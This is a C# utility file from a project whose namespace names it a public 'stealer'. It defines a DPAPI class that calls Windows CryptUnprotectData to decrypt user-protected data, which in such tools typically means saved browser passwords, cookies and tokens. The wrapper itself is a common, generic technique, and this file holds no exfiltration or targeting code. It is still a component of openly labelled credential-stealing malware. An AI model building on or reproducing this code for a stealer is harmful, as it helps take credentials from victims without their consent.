using System;
using System.Runtime.InteropServices;

namespace Overdose_PublicStealer.Utils
{
    internal static class DPAPI
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(
            ref DATA_BLOB pCipherText,
            string szDescription,
            ref DATA_BLOB pEntropy,
            IntPtr pReserved,
            IntPtr pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        public static byte[] Decrypt(byte[] cipherTextBytes)
        {
            DATA_BLOB cipherBlob = new DATA_BLOB();
            DATA_BLOB plainBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            try
            {
                cipherBlob.cbData = cipherTextBytes.Length;
                cipherBlob.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                Marshal.Copy(cipherTextBytes, 0, cipherBlob.pbData, cipherTextBytes.Length);

                bool success = CryptUnprotectData(
                    ref cipherBlob,
                    null,
                    ref entropyBlob,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    ref plainBlob);

                if (!success)
                    return null;

                byte[] plainBytes = new byte[plainBlob.cbData];
                Marshal.Copy(plainBlob.pbData, plainBytes, 0, plainBlob.cbData);

                return plainBytes;
            }
            finally
            {
                if (cipherBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherBlob.pbData);
                if (plainBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainBlob.pbData);
            }
        }
    }
}
